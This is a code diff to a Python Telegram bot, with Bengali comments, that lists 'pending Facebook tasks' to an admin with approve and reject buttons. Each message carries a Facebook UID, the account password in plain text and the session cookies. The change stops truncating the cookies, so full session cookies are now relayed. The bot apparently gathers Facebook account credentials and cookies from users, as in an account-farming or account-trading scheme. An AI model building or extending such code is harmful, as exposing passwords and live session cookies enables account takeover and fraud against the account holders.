@@ -287,27 +287,25 @@ def handle_callbacks(call):
         return
 
     elif call.data == "show_p_facebook":
-        # প্রথমে ক্লাউড থেকে ডাটা রিলোড দিয়ে নিন
-        load_database() 
-        
         if not fb_pending_tasks:
             bot.answer_callback_query(call.id, "📭 ফেসবুকের কোনো পেন্ডিং কাজ নেই।", show_alert=True)
             return
-            
         bot.answer_callback_query(call.id)
-        # লুপের ভেতরে ডাটা গুলো দেখান
-        for fb_uid, data in fb_pending_tasks.items():
+        for fb_uid, data in list(fb_pending_tasks.items()):
             fkb = types.InlineKeyboardMarkup(row_width=2)
             fkb.add(
                 types.InlineKeyboardButton("✅ Approve", callback_data=f"fb_apr_{fb_uid}"),
                 types.InlineKeyboardButton("❌ Reject", callback_data=f"fb_rej_{fb_uid}")
             )
             details = (
-                f"📥 **ফেসবুক পেন্ডিং কাজ**\n"
-                f"🏷️ Username: @{data.get('tg_username', 'N/A')}\n"
+                f"📥 **ফেসবুক পেন্ডিং কাজ**\n━━━━━━━━━━━━━━━━━━━━\n"
+                f"🏷️ Username: @{data['tg_username']}\n"
+                f"🆔 User I.D: `{data['user_id']}`\n"
+                f"👤 First name: `{data['first_name']}`\n"
+                f"👤 Last name: `{data['last_name']}`\n"
+                f"🔒 Password: `{data['password']}`\n"
                 f"🔵 Facebook UID: `{fb_uid}`\n"
-                f"🔒 Password: `{data.get('password', 'N/A')}`\n"
-                f"🍪 Cookies: `{data.get('cookies', 'N/A')[:100]}...`" # কুকিজ অনেক বড় হলে মেসেজ লিমিট পার হতে পারে
+                f"🍪 Cookies:\n`{data.get('cookies', 'N/A')}`"
             )
             bot.send_message(chat_id, details, reply_markup=fkb, parse_mode="Markdown")
         return
